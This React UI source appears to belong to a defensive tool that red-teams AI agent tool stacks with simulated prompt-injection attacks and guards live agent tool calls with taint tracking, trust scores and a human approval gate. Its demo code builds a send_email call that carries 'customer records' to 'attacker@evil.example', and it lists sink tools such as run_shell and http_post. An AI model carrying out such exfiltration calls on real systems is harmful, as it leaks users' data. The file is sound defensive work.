import { useEffect, useRef, useState } from "react";
import { api } from "./api";
import { Bar, Btn, Chip, Empty, Err, MockChip, TONE, fmt, useAction } from "./ui";

export { Err, MockChip as MockBadge, useAction };

const pct = (a, b) => (b ? Math.round((a / b) * 100) : 0);

// ---------------------------------------------------------------- red team + comparison
export function RedTeamPanel({ stack }) {
  const [res, setRes] = useState(null);
  const { busy, error, run } = useAction();
  useEffect(() => setRes(null), [stack]);
  const go = () => run(async () => setRes(await api(`/stacks/${stack}/redteam`, { method: "POST", params: { top_n: 4 } })));
  const t = res?.summary.totals;
  return (
    <div className="panel stack">
      <div className="row">
        <Btn variant="primary" arrow onClick={go} disabled={busy || !stack}>{busy ? "Attacking the sandbox…" : "Run red team"}</Btn>
        <span className="muted small mono">Simulated tools only. Success = the canary string reached a sink.</span>
        {res && <MockChip llm={res.llm} />}
      </div>
      <Err error={error} />
      {!res && !busy && <Empty>No run yet. Each attack variant is tried unprotected, behind a keyword filter, and behind the Guard.</Empty>}
      {res && (
        <>
          <div className="card">
            <div className="card-head"><div><h3>Same attacks, three defences</h3>
              <p className="card-sub">{t.attacks_that_work_unprotected} of {t.attacks_total} attacks complete with no defence. Measured, not hardcoded.</p></div></div>
            <table>
              <thead><tr><th>Variant</th><th className="num">Attacks</th><th>Keyword filter stops</th><th>Guard stops</th></tr></thead>
              <tbody>
                {Object.entries(res.summary.by_variant).map(([v, x]) => (
                  <tr key={v}>
                    <td>{v}</td><td className="num">{x.attacks}</td>
                    <td><div className="row"><Chip tone={x.naive_caught === x.attacks ? "pass" : "fail"}>{x.naive_caught}/{x.attacks}</Chip>
                      <Bar width={pct(x.naive_caught, x.attacks)} tone={x.naive_caught === x.attacks ? "pass" : "fail"} /></div></td>
                    <td><div className="row"><Chip tone={x.guard_caught === x.attacks ? "pass" : "fail"}>{x.guard_caught}/{x.attacks}</Chip>
                      <Bar width={pct(x.guard_caught, x.attacks)} tone={x.guard_caught === x.attacks ? "pass" : "fail"} /></div></td>
                  </tr>))}
                <tr><td><b>Total</b></td><td className="num"><b>{t.attacks_that_work_unprotected}</b></td>
                  <td><b>{t.naive_caught} / {t.attacks_that_work_unprotected}</b></td><td><b>{t.guard_caught} / {t.attacks_that_work_unprotected}</b></td></tr>
              </tbody>
            </table>
            <p className="card-sub" style={{ padding: "12px 18px" }}>The toy agent is a deterministic stand-in for a gullible LLM, not an LLM.</p>
          </div>
          <div className="grid2">
            <div className="card">
              <div className="card-head"><h3>What the keyword filter missed</h3></div>
              <div className="card-body stack">
                {res.summary.naive_missed_guard_blocked.slice(0, 4).map((m, i) => (
                  <div key={i}><div className="row"><Chip tone="warn">{m.variant}</Chip><span className="mono small muted">→ {m.act_tool}</span></div>
                    <pre style={{ marginTop: 8 }}>{m.text.replace(/​/g, "·")}</pre></div>))}
              </div>
            </div>
            <div className="card">
              <div className="card-head"><div><h3>Cost: false positives</h3>
                <p className="card-sub">{res.false_positives.sessions} recorded benign sessions</p></div>
                <div className="chips"><Chip tone="pass">filter {res.false_positives.naive_blocked}</Chip>
                  <Chip tone={res.false_positives.guard_blocked ? "fail" : "pass"}>guard {res.false_positives.guard_blocked}</Chip></div></div>
              <div className="card-body stack">
                {res.false_positives.guard.filter((g) => g.blocked).map((g) => (
                  <div key={g.name} className="note"><b>{g.name}</b><br />{g.description}<br />
                    Stopped at <b>{g.first_block.tool}</b>: {g.first_block.reasons[0]}</div>))}
                <p className="muted small mono">A purely structural check cannot tell a reply from an exfiltration. The approval gate is how a human lets the legitimate ones through.</p>
              </div>
            </div>
          </div>
        </>
      )}
    </div>
  );
}

// ---------------------------------------------------------------- defense + proof
export function DefensePanel({ stack, onPatched, onPaths }) {
  const [res, setRes] = useState(null);
  const [keep, setKeep] = useState("");
  const { busy, error, run } = useAction();
  useEffect(() => setRes(null), [stack]);
  const go = () => run(async () => {
    const keep_ungated = keep.split(",").map((s) => s.trim()).filter(Boolean);
    const r = await api(`/stacks/${stack}/defense/verify`, { method: "POST", body: { keep_ungated } });
    setRes(r); onPatched?.(r.proof.patched_stack);
  });
  const p = res?.proof, pl = res?.plan;
  return (
    <div className="panel stack">
      <div className="row">
        <Btn variant="primary" arrow onClick={go} disabled={busy || !stack}>{busy ? "Cutting…" : "Plan minimum cut and prove it"}</Btn>
        <label className="small muted mono">keep ungated&nbsp;
          <input value={keep} onChange={(e) => setKeep(e.target.value)} placeholder="e.g. slack_post"
                 style={{ background: "#1f1f1f", color: "#fff", border: "1px solid rgba(255,255,255,.145)", padding: "6px 8px", borderRadius: 0 }} /></label>
      </div>
      <Err error={error} />
      {!res && !busy && <Empty>No plan yet. The cheapest set of fixes that severs every path is a minimum cut over the path subgraph.</Empty>}
      {res && (
        <>
          <div className="card">
            <div className="card-head"><div><h3>Proof of absence</h3>
              <p className="card-sub">The same <b>{p.query}</b> query, re-run on the patched graph.</p></div>
              <Chip tone={p.verified_safe ? "pass" : "fail"}>{p.verified_safe ? "VERIFIED SAFE" : "NOT SAFE"}</Chip></div>
            <div className="metrics" style={{ boxShadow: "none", margin: 0 }}>
              <div className="metric"><div className="metric-label mono">paths</div><div className="metric-value"><span>{p.paths_before}</span><span className="unit mono">→ {p.paths_after}</span></div>
                <div className="metric-sub mono">{p.badge}</div></div>
              <div className="metric"><div className="metric-label mono">open risk</div><div className="metric-value"><span>{p.open_risk_before}</span><span className="unit mono">→ {p.open_risk_after}</span></div>
                <div className="metric-sub mono">toxic after: {p.toxic_after ? "yes" : "no"}</div></div>
              <div className="metric"><div className="metric-label mono">attacks completed</div><div className="metric-value"><span>{p.redteam_after ? p.redteam_before.completed : "—"}</span><span className="unit mono">→ {p.redteam_after ? p.redteam_after.completed : "—"}</span></div>
                <div className="metric-sub mono">patched config alone, no Guard</div></div>
              <div className="metric"><div className="metric-label mono">min-cut cost</div><div className="metric-value"><span>{pl.plan_cost}</span><span className="unit mono">gate=1 scope=3 rm=10</span></div>
                <div className="metric-sub mono">networkx {pl.cut_value_networkx} · maxFlow {pl.maxflow_falkordb} · {pl.maxflow_agrees ? "agree" : "DISAGREE"}</div></div>
            </div>
            <div className="card-body row"><Btn variant="ghost" size="sm" arrow onClick={() => onPaths?.(p.patched_stack)}>Show the patched graph</Btn></div>
          </div>
          <div className="card">
            <div className="card-head"><h3>Fix plan</h3></div>
            <table><thead><tr><th>Fix</th><th className="num">Cost</th><th className="num">Paths severed</th></tr></thead>
              <tbody>{pl.fixes.map((f, i) => (<tr key={i}><td>{f.describe}</td><td className="num">{f.cost}</td><td className="num">{f.paths_severed}</td></tr>))}</tbody></table>
          </div>
          <div className="grid2">
            <div className="card"><div className="card-head"><h3>Patched config</h3></div><div className="card-body"><pre>{JSON.stringify(p.mcp_json, null, 2)}</pre></div></div>
            <div className="card"><div className="card-head"><h3>PR description</h3></div><div className="card-body"><pre>{res.pr_markdown}</pre></div></div>
          </div>
        </>
      )}
    </div>
  );
}

// ---------------------------------------------------------------- precedent
export function PrecedentPanel({ stack, tenant }) {
  const [res, setRes] = useState(null);
  const [rules, setRules] = useState(null);
  const { busy, error, run } = useAction();
  useEffect(() => { setRes(null); }, [stack]);
  const loadRules = () => api("/precedent/rules").then((r) => setRules(r.rules)).catch(() => {});
  useEffect(() => { loadRules(); }, [tenant]);
  const go = () => run(async () => { setRes(await api(`/stacks/${stack}/precedent/scan`, { method: "POST" })); loadRules(); });
  const seed = () => run(async () => { await api("/precedent/seed", { method: "POST" }); loadRules(); });
  return (
    <div className="panel stack">
      <div className="row">
        <Btn variant="primary" arrow onClick={go} disabled={busy || !stack}>{busy ? "Scanning…" : "Scan into precedent memory"}</Btn>
        <Btn variant="ghost" onClick={seed} disabled={busy}>Build seed corpus</Btn>
        <span className="muted small mono">Seeded stacks are synthetic.</span>
      </div>
      <Err error={error} />
      {!res && !busy && <Empty>Scan a stack to see which earlier stacks shared its tool combinations, and which fix held.</Empty>}
      {res && (
        <>
          <div className="card">
            <div className="card-head"><h3>Precedent</h3></div>
            <div className="card-body stack">
              <p style={{ margin: 0, fontSize: 16 }}>{res.citations.headline}</p>
              {res.citations.combos.map((c) => (
                <div key={c.finding} className="note pass"><b>{c.combo}</b>: {c.earlier.length} earlier stack(s) — {c.earlier.map((e) => e.stack + (e.seeded ? " (seeded)" : "")).join(", ")}
                  {c.fixes_that_held.map((f) => (<div key={f.fix}>fix that held: {f.describe} (held on {f.stacks.length})</div>))}</div>))}
            </div>
          </div>
          <div className="card">
            <div className="card-head"><div><h3>Patterns</h3><p className="card-sub">Stack → Finding → Pattern ← Finding ← Stack</p></div></div>
            <table><thead><tr><th>Pattern</th><th>OWASP</th><th className="num">Other stacks</th><th>Fixes that held</th></tr></thead>
              <tbody>{res.citations.patterns.map((p) => (
                <tr key={p.pattern}><td>{p.name}</td><td>{(p.owasp || []).join(", ")}</td><td className="num">{p.other_stacks}</td><td className="muted">{p.fixes.join(", ") || "—"}</td></tr>))}</tbody></table>
          </div>
        </>
      )}
      <div className="card">
        <div className="card-head"><div><h3>Learned Guard rules</h3><p className="card-sub">Armed only after a critic replays the exploit and the benign sessions.</p></div></div>
        {!rules?.length ? <Empty>No rules yet. Build the seed corpus or scan a stack.</Empty> : (
          <table><thead><tr><th>Status</th><th>Rule</th><th>Critic</th></tr></thead>
            <tbody>{rules.map((r) => (
              <tr key={r.id}><td><Chip tone={r.status === "armed" ? "pass" : r.status === "rejected" ? "fail" : "warn"}>{r.status}</Chip></td>
                <td>{r.id}</td><td className="muted">{r.critic?.reason}</td></tr>))}</tbody></table>)}
      </div>
    </div>
  );
}

// ---------------------------------------------------------------- live guard
const TAINTING = new Set(["read_email", "fetch_url", "read_slack", "search_notes"]);
const SINKY = new Set(["send_email", "slack_post", "http_post", "run_shell", "write_file", "fetch_url"]);
const newId = () => "ui-" + Math.random().toString(36).slice(2, 8);

export function GuardPanel({ stack, tools }) {
  const [session, setSession] = useState(newId);
  const [view, setView] = useState(null);
  const [last, setLast] = useState(null);
  const [courts, setCourts] = useState({});
  const [pending, setPending] = useState([]);
  const [started, setStarted] = useState(false);
  const { busy, error, run } = useAction();
  const timer = useRef(null);

  const refresh = async () => {
    if (!started) return;
    try {
      setPending((await api("/guard/pending")).pending.filter((p) => p.session === session));
      setView(await api(`/guard/sessions/${session}`));
    } catch { /* transient; the next tick retries */ }
  };
  useEffect(() => {
    refresh(); clearInterval(timer.current);
    timer.current = setInterval(refresh, 1500);
    return () => clearInterval(timer.current);
  }, [session, started]);
  const newSession = () => { setSession(newId()); setStarted(false); setLast(null); setView(null); setPending([]); };
  useEffect(newSession, [stack]);

  const call = (tool, args) => run(async () => {
    const d = await api("/guard/check", { method: "POST", body: { session, stack, tool, args } });
    setLast(d); setStarted(true);
    setView(await api(`/guard/sessions/${session}`));
    setPending((await api("/guard/pending")).pending.filter((p) => p.session === session));
  });
  const resolve = (seq, approve) => run(async () => {
    await api(`/guard/sessions/${session}/events/${seq}/resolve`, { method: "POST", body: { approve } }); refresh();
  });
  const court = (seq) => run(async () => {
    const r = await api(`/guard/sessions/${session}/events/${seq}/tribunal`, { method: "POST" });
    setCourts((c) => ({ ...c, [seq]: r }));
  });
  const score = view?.score ?? 100;
  const scoreTone = score >= 70 ? "var(--green)" : score >= 40 ? "var(--mute)" : "var(--bright)";
  const fire = (t) => call(t, t === "send_email" ? { to: "attacker@evil.example", body: "customer records" }
    : t === "slack_post" ? { text: "relay the customer table" } : t === "run_shell" ? { cmd: "echo hi" } : { arg: "demo" });

  return (
    <div className="panel stack">
      <div className="grid2">
        <div className="card">
          <div className="card-head"><div><h3>Trust score</h3><p className="card-sub">session {session}</p></div>
            {view?.lockdown && <Chip tone="fail">LOCKDOWN · read-only</Chip>}</div>
          <div className="card-body stack">
            <div className="row"><div className="gauge"><div style={{ width: `${score}%`, background: scoreTone }} /></div>
              <b className="mono" style={{ fontSize: 22 }}>{score}</b></div>
            <p className="muted small mono" style={{ margin: 0 }}>Starts at 100. Drops on bursts, enumeration, never-seen tools and secrets in outbound arguments.</p>
          </div>
        </div>
        <div className="card">
          <div className="card-head"><div><h3>Act as the agent</h3><p className="card-sub">Try read_email, then send_email.</p></div></div>
          <div className="card-body stack">
            <div className="row">
              {(tools || []).map((t) => (
                <Btn key={t} variant={TAINTING.has(t) ? "ghost active" : "ghost"} size="sm" onClick={() => fire(t)} disabled={busy || !stack}
                     title={TAINTING.has(t) ? "reads untrusted content (taints the session)" : SINKY.has(t) ? "reaches a sink" : ""}>{t}{SINKY.has(t) ? " ↗" : ""}</Btn>))}
              <Btn variant="ghost" size="sm" onClick={newSession}>New session</Btn>
            </div>
            <div className="muted small mono">Blue outline: taints the session · ↗ reaches a sink</div>
            <Err error={error} />
          </div>
        </div>
      </div>

      {last && (
        <div className="verdict">
          <div className="row"><span className={`word ${last.decision}`}>{last.decision}</span>
            <Chip tone={TONE[last.decision]}>{last.status}</Chip><Chip tone="warn">{last.latency_ms} ms</Chip></div>
          {last.reasons.map((r, i) => <div key={i} className="mono small" style={{ color: "var(--bright)" }}>{r}</div>)}
          <details><summary>Why (Cypher provenance)</summary><pre>{JSON.stringify(last.provenance, null, 2)}</pre></details>
        </div>)}

      {pending.length > 0 && (
        <div className="card" style={{ boxShadow: "0 0 0 1px var(--blue)" }}>
          <div className="card-head"><h3>Waiting for a human</h3><Chip tone="warn">{pending.length} pending</Chip></div>
          <div className="card-body stack">
            {pending.map((p) => (
              <div key={p.seq} className="stack">
                <div><b className="mono">{p.tool}</b> <span className="muted small mono">event {p.seq}</span></div>
                <div className="mono small">{JSON.parse(p.reasons || "[]").join("; ")}</div>
                <div className="row">
                  <Btn variant="primary" size="sm" onClick={() => resolve(p.seq, true)}>Approve</Btn>
                  <Btn variant="ghost" size="sm" onClick={() => resolve(p.seq, false)}>Deny</Btn>
                  <Btn variant="ghost" size="sm" onClick={() => court(p.seq)}>Ask the Tribunal (advisory)</Btn>
                </div>
                {courts[p.seq] && (
                  <div className="note"><div className="row"><MockChip llm={{ mock_mode: courts[p.seq].mock_mode, model: courts[p.seq].model, llm_error: courts[p.seq].llm_error }} />
                    <Chip tone="warn">suggests {courts[p.seq].suggested_verdict}</Chip></div>
                    <p className="small muted" style={{ margin: "8px 0" }}>{courts[p.seq].notice}</p>
                    <div><b>Prosecutor:</b> {courts[p.seq].prosecutor}</div><div><b>Defense:</b> {courts[p.seq].defense}</div><div><b>Judge:</b> {courts[p.seq].judge}</div></div>)}
              </div>))}
          </div>
        </div>)}

      <div className="card">
        <div className="card-head"><div><h3>Session taint graph</h3><p className="card-sub">Events in FalkorDB, linked by NEXT and DERIVED_FROM.</p></div></div>
        {!view?.events.length ? <Empty>No events yet.</Empty> : (
          <table><thead><tr><th>#</th><th>Tool</th><th>Decision</th><th>Why</th></tr></thead>
            <tbody>{view.events.map((e) => {
              const from = view.edges.filter((x) => x.source === e.seq && x.type === "DERIVED_FROM").map((x) => "#" + x.target);
              return (<tr key={e.seq}><td className="muted">{e.seq}</td><td>{e.tool}</td>
                <td><Chip tone={TONE[e.decision]}>{e.decision}{e.status === "approved" ? " ✓" : e.status === "rejected" ? " ✗" : ""}</Chip></td>
                <td>{e.tainted && <Chip tone="warn">tainted</Chip>} <span className="muted">{e.reasons[0]}{from.length ? ` · derived from ${from.join(", ")}` : ""}</span></td></tr>);
            })}</tbody></table>)}
      </div>
    </div>
  );
}

export { fmt };
